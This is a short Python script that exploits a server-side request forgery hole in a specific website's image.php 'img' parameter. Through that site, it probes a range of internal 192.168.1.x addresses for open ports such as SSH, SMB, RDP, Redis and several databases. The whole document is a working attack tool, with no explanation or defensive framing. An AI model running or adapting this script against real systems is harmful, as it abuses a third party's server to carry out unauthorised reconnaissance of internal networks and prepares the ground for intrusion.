#coding=utf8
import requests

ports = [21,22,445,80,3306,1521,1433,5432,6379,27017,3389,8080]
hosts = ['192.168.1.%s'%ip for ip in range(200,254)]

def testport(ip,port):
    url = "http://www.suliu.net/image.php?img=http://%s:%s"%(ip,port)
    try:
        req = requests.get(url,timeout=5,verify=False)
        if req.text:
            print("I-%s:%s is open"%(ip,port))
            return
    except:
        pass
    #print("E-%s:%s is close"%(ip,port))

for ip in hosts:
    for port in ports:
        testport(ip,port)